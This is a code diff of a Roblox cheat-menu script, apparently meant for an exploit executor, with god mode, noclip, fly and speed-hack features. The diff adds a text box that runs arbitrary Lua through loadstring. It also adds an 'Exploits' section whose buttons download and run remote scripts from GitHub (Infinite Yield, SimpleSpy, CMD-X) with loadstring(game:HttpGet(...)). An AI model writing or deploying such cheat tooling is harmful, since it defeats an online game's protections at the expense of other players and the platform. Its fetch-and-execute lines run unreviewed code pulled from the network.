@@ -74,7 +74,7 @@ collapseIcon.MouseButton1Click:Connect(function()
     if not isCollapsed then
         TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size = COLLAPSED_SIZE}):Play()
         contentFrame.Visible = false
-        collapseIcon.Text = "🌀"
+        collapseIcon.Text = "🌍"
     else
         TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size = fullSize}):Play()
         contentFrame.Visible = true
@@ -217,43 +217,114 @@ local spawnedParts = {}
 local godModeToggle, noClipToggle, flyToggle
 local speedHackValue = 16
 local jumpPowerValue = 50
+local originalWalkSpeed = 16
+
+-- New function for Lua executor
+local function createLuaExecutor(parent)
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(1, 0, 0, 150)
+    container.BackgroundTransparency = 1
+    container.Parent = parent
+
+    local textBox = Instance.new("TextBox")
+    textBox.Size = UDim2.new(1, 0, 0, 100)
+    textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    textBox.TextColor3 = Color3.new(1, 1, 1)
+    textBox.Text = "-- Enter Lua code here"
+    textBox.TextWrapped = true
+    textBox.TextXAlignment = Enum.TextXAlignment.Left
+    textBox.TextYAlignment = Enum.TextYAlignment.Top
+    textBox.Font = Enum.Font.Code
+    textBox.TextSize = 14
+    textBox.ClearTextOnFocus = false
+    textBox.MultiLine = true
+    textBox.Parent = container
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = textBox
+
+    local executeBtn = Instance.new("TextButton")
+    executeBtn.Size = UDim2.new(1, 0, 0, 30)
+    executeBtn.Position = UDim2.new(0, 0, 0, 110)
+    executeBtn.BackgroundColor3 = MAIN_COLOR
+    executeBtn.Text = "Execute"
+    executeBtn.TextColor3 = Color3.new(1, 1, 1)
+    executeBtn.Font = Enum.Font.Gotham
+    executeBtn.TextSize = 18
+    executeBtn.Parent = container
+
+    local corner2 = Instance.new("UICorner")
+    corner2.CornerRadius = UDim.new(0, 6)
+    corner2.Parent = executeBtn
+
+    executeBtn.MouseButton1Click:Connect(function()
+        local success, errorMsg = pcall(function()
+            loadstring(textBox.Text)()
+        end)
+        if not success then
+            warn("Execution error: "..errorMsg)
+        end
+    end)
+end
 
 createCategory(contentFrame, "Tools")
 
 createButton(contentFrame, "Give F3X", function()
     local f3x = game:GetObjects("rbxassetid://11040063484")[1]
-    f3x.Parent = player.Backpack
+    f3x.Parent = player:FindFirstChildOfClass("Backpack") or player:WaitForChild("Backpack")
 end)
 
 createButton(contentFrame, "Spawn Coil Gun", function()
-    local coil = Instance.new("Part")
-    coil.Size = Vector3.new(2, 2, 4)
-    coil.Position = player.Character.HumanoidRootPart.Position + Vector3.new(0, 5, 0)
-    coil.BrickColor = BrickColor.new("Really red")
-    coil.Anchored = false
-    coil.CanCollide = true
-    
-    local weld = Instance.new("Weld")
-    weld.Part0 = coil
-    weld.Part1 = player.Character.HumanoidRootPart
-    weld.C0 = CFrame.new(0, 0, -3)
-    weld.Parent = coil
-    
-    local clickDetector = Instance.new("ClickDetector")
-    clickDetector.Parent = coil
-    
-    clickDetector.MouseClick:Connect(function()
-        local projectile = Instance.new("Part")
-        projectile.Size = Vector3.new(0.5, 0.5, 2)
-        projectile.Position = coil.Position
-        projectile.Velocity = coil.CFrame.LookVector * 500
-        projectile.BrickColor = BrickColor.new("Bright yellow")
-        projectile.Parent = workspace
-    end)
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        local coil = Instance.new("Part")
+        coil.Size = Vector3.new(2, 2, 4)
+        coil.Position = player.Character.HumanoidRootPart.Position + Vector3.new(0, 5, 0)
+        coil.BrickColor = BrickColor.new("Really red")
+        coil.Anchored = false
+        coil.CanCollide = true
+        
+        local weld = Instance.new("WeldConstraint")
+        weld.Part0 = coil
+        weld.Part1 = player.Character.HumanoidRootPart
+        weld.Parent = coil
+        
+        local clickDetector = Instance.new("ClickDetector")
+        clickDetector.Parent = coil
+        
+        clickDetector.MouseClick:Connect(function()
+            local projectile = Instance.new("Part")
+            projectile.Size = Vector3.new(0.5, 0.5, 2)
+            projectile.Position = coil.Position + coil.CFrame.LookVector * 3
+            projectile.CFrame = CFrame.new(projectile.Position, projectile.Position + coil.CFrame.LookVector)
+            projectile.Velocity = coil.CFrame.LookVector * 500
+            projectile.BrickColor = BrickColor.new("Bright yellow")
+            projectile.Anchored = false
+            projectile.CanCollide = false
+            projectile.Parent = workspace
+            
+            game:GetService("Debris"):AddItem(projectile, 5)
+        end)
+        
+        table.insert(spawnedParts, coil)
+    end
 end)
+
+createCategory(contentFrame, "Lua Executor")
+createLuaExecutor(contentFrame)
+
+createCategory(contentFrame, "Exploits")
 
 createButton(contentFrame, "Infinite Yield", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end)
+
+createButton(contentFrame, "Remote Spy", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
+end)
+
+createButton(contentFrame, "CMD-X", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
 end)
 
 createCategory(contentFrame, "Movement")
@@ -275,6 +346,13 @@ end)
 
 flyToggle = createToggle(contentFrame, "Fly", function(state)
     if state then
+        originalWalkSpeed = speedHackValue
+        -- Set walk speed to 50 when flying
+        local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = 50
+        end
+        
         local bodyVelocity = Instance.new("BodyVelocity")
         bodyVelocity.Velocity = Vector3.new(0, 0, 0)
         bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
@@ -309,6 +387,12 @@ flyToggle = createToggle(contentFrame, "Fly", function(state)
             end
         end)
     else
+        -- Restore original walk speed when turning off fly
+        local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = originalWalkSpeed
+        end
+        
         if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
             local velocity = player.Character.HumanoidRootPart:FindFirstChild("FlyBodyVelocity")
             if velocity then velocity:Destroy() end
